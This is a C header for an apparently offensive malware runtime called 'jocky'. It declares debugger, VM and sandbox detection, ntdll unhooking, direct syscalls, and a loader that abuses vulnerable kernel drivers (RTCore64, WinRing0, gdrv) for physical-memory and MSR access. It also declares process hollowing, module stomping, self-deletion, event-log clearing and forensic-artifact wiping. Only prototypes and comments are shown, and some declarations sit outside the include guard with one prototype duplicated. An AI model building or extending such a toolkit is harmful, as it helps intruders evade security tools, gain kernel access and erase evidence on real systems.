#ifndef JOCKY_RT_H
#define JOCKY_RT_H

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

/* ============================================================================
 * Anti-Analysis: Debugger, VM, Sandbox Detection
 * ============================================================================ */

typedef enum {
    JOCKY_ANALYSIS_CLEAN = 0,
    JOCKY_ANALYSIS_DEBUGGER = 1 << 0,
    JOCKY_ANALYSIS_VM = 1 << 1,
    JOCKY_ANALYSIS_SANDBOX = 1 << 2,
} jocky_analysis_flags_t;

/* Run all anti-analysis checks. Returns bitmask of detected threats. */
uint32_t jocky_check_analysis_environment(void);

/* Individual checks */
bool jocky_is_debugger_present(void);
bool jocky_is_remote_debugger(void);
bool jocky_check_hardware_breakpoints(void);
bool jocky_is_vm(void);
bool jocky_is_sandbox(void);

/* Timing checks */
bool jocky_check_timing_rdtsc(void);
bool jocky_check_timing_api(void);

/* ============================================================================
 * Evasion: Unhooking, Syscalls, Stack Spoofing
 * ============================================================================ */

#ifdef _WIN32
/* Unhook ntdll.dll by reloading a fresh copy from disk */
bool jocky_unhook_ntdll(void);

/* Get syscall number for a given Zw* function name */
uint32_t jocky_get_syscall_number(const char* zw_name);

/* Execute a direct syscall */
intptr_t jocky_direct_syscall(uint32_t syscall_number, ...);
#endif /* _WIN32 */

/* ============================================================================
 * BYOVD Loader
 * ============================================================================ */

#ifdef _WIN32
#include <windows.h>

/* State returned by jocky_byovd_load; pass to jocky_byovd_unload. */
typedef struct {
    HANDLE device;               /* open device handle (INVALID_HANDLE_VALUE if no symlink) */
    char   driver_path[MAX_PATH];/* path of the dropped .sys on disk */
    char   service_name[64];     /* SCM service name used to register it */
} jocky_byovd_t;

/* Extract the driver from the .jdrv PE section, drop it to %TEMP%, create
 * a kernel service, start it, and open a handle to \\.\ device_name.
 *
 * service_name  – SCM service name (NULL = auto-generate "jky_<hex>")
 * device_name   – NT device symlink name without "\\.\", e.g. "MyDriver"
 *                 (NULL = same as service_name)
 * out           – filled on success; caller must call jocky_byovd_unload()
 *
 * Returns false if no .jdrv section exists or any step fails.
 * Requires SeLoadDriverPrivilege / Administrator. */
bool jocky_byovd_load(const char* service_name,
                      const char* device_name,
                      jocky_byovd_t* out);

/* Stop the service, delete it from SCM, and delete the dropped .sys file. */
void jocky_byovd_unload(jocky_byovd_t* ctx);

/* ── Driver Interaction ─────────────────────────────────────────────────
 *
 * Two complementary systems:
 *
 *  1. Static profile table  – knows RTCore64, WinRing0/x64, gdrv.
 *     Primitive wrappers (read_phys / write_phys / read_msr / write_msr)
 *     auto-detect the loaded driver from ctx->service_name and use the
 *     correct IOCTL+buffer layout.
 *
 *  2. Dynamic .jmani manifest  – embedded at build time by
 *     "jockyc --manifest <file>".  Exposes any IOCTL by name via
 *     jocky_driver_invoke().  Falls back to this when the driver is not
 *     in the static table.
 *
 * Both systems use the same jocky_byovd_t handle returned by jocky_byovd_load.
 * ─────────────────────────────────────────────────────────────────────── */

/* Parse the .jmani section and populate the manifest cache.
 * Called automatically at first jocky_driver_invoke(); only needed
 * manually if you want early failure detection. */
bool jocky_manifest_load(void);

/* Read <size> bytes of physical memory starting at phys_addr into out.
 * Supports: RTCore64, WinRing0, WinRing0x64.
 * Falls back to manifest primitive "read_phys" for unknown drivers. */
bool jocky_driver_read_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                             void* out, uint32_t size);

/* Write <size> bytes from in to physical memory at phys_addr.
 * Supports: RTCore64, WinRing0, WinRing0x64. */
bool jocky_driver_write_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                              const void* in, uint32_t size);

/* Read a model-specific register.
 * Supports: WinRing0, WinRing0x64. */
bool jocky_driver_read_msr(jocky_byovd_t* ctx, uint32_t msr_id,
                            uint64_t* out);

/* Write a model-specific register.
 * Supports: WinRing0, WinRing0x64. */
bool jocky_driver_write_msr(jocky_byovd_t* ctx, uint32_t msr_id,
                             uint64_t val);

/* Map a physical address range and return the kernel VA via gdrv.
 * out_va receives the kernel virtual address.
 * Supports: gdrv. */
bool jocky_driver_map_phys(jocky_byovd_t* ctx, uint64_t phys_addr,
                            uint32_t size, uintptr_t* out_va);

/* Generic IOCTL dispatch via the .jmani manifest.
 * primitive  – must match a name in the embedded manifest exactly.
 * in_buf     – input buffer (may be NULL if in_size == 0).
 * in_size    – input buffer size in bytes.
 * out_buf    – output buffer (may be NULL if out_size == 0).
 * out_size   – output buffer size in bytes.
 * Returns false if the primitive name is not found or the IOCTL fails. */
bool jocky_driver_invoke(jocky_byovd_t* ctx, const char* primitive,
                         const void* in_buf,  uint32_t in_size,
                         void*       out_buf, uint32_t out_size);

#endif /* _WIN32 (BYOVD + driver interaction) */

/* ============================================================================
 * Execution: In-Memory Techniques
 * ============================================================================ */

#ifdef _WIN32
/* Process hollowing: replace a suspended process image */
bool jocky_process_hollow(const wchar_t* target_path,
                          const uint8_t* payload,
                          size_t payload_size);

/* Module stomping: overwrite a loaded DLL in a remote process */
bool jocky_module_stomp(uint32_t pid,
                        const wchar_t* module_name,
                        const uint8_t* payload,
                        size_t payload_size);
#endif /* _WIN32 */

/* ============================================================================
 * Cleanup: Self-Deletion, Log Clearing, Anti-Forensics
 * ============================================================================ */

/* Delete the running executable from disk (Windows: pending rename, Linux: unlink) */
bool jocky_self_delete(void);

/* Clear system event logs */
bool jocky_clear_logs(void);

/* Wipe Prefetch / cache artifacts */
bool jocky_wipe_artifacts(void);

/* ============================================================================
 * Crypto: String / Data Decryption
 * ============================================================================ */

/* Simple XOR decrypt in-place. Key rotates per byte. */
void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);

/* RC4-based stream decrypt */
void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);

/* ============================================================================
 * Integrity Verification
 * ============================================================================ */

/* Verify the on-disk binary against the .jtamp checksum embedded by the
 * packer.  Calls ExitProcess(0xDEAD1337) on mismatch.  Returns true if the
 * check passed or if .jtamp was not found (unpacked build).
 * Windows only; always returns true on other platforms.
 */
bool jocky_verify_integrity(void);

/* ============================================================================
 * Initialization
 * ============================================================================ */

/* Full runtime initialization sequence:
 *  1. Integrity check  (abort if binary was patched)
 *  2. Anti-analysis checks
 *  3. Return threat bitmask (0 = clean)
 */
uint32_t jocky_runtime_init(void);

#ifdef __cplusplus
}
#endif

#endif /* JOCKY_RT_H */

/* ============================================================================
 * Direct Syscalls (Hell's Gate) - Windows x64
 * ============================================================================ */

#ifdef _WIN32

/* Execute direct syscall with 4 arguments */
intptr_t jocky_direct_syscall4(uint32_t syscall_number, 
                                uintptr_t a1, uintptr_t a2, 
                                uintptr_t a3, uintptr_t a4);

/* Execute direct syscall with 6 arguments */
intptr_t jocky_direct_syscall6(uint32_t syscall_number,
                                uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4,
                                uintptr_t a5, uintptr_t a6);

/* Get syscall number by name (e.g., "NtAllocateVirtualMemory") */
uint32_t jocky_get_syscall_num(const char* zw_name);

/* Convenience wrappers */
NTSTATUS jocky_nt_allocate_virtual_memory(HANDLE process, PVOID* base,
                                           ULONG_PTR zero_bits, PSIZE_T size,
                                           ULONG type, ULONG protect);

NTSTATUS jocky_nt_protect_virtual_memory(HANDLE process, PVOID* base,
                                          PSIZE_T size, ULONG new_protect,
                                          PULONG old_protect);

NTSTATUS jocky_nt_create_thread(HANDLE* thread_handle, ACCESS_MASK desired_access,
                                 POBJECT_ATTRIBUTES object_attributes, HANDLE process_handle,
                                 PVOID start_routine, PVOID argument,
                                 ULONG create_flags, PULONG thread_id);

NTSTATUS jocky_nt_write_virtual_memory(HANDLE process, PVOID base, PVOID buffer,
                                        SIZE_T size, PSIZE_T written);

NTSTATUS jocky_nt_protect_virtual_memory(HANDLE process, PVOID* base,
                                          PSIZE_T size, ULONG new_protect,
                                          PULONG old_protect);

#endif /* _WIN32 */
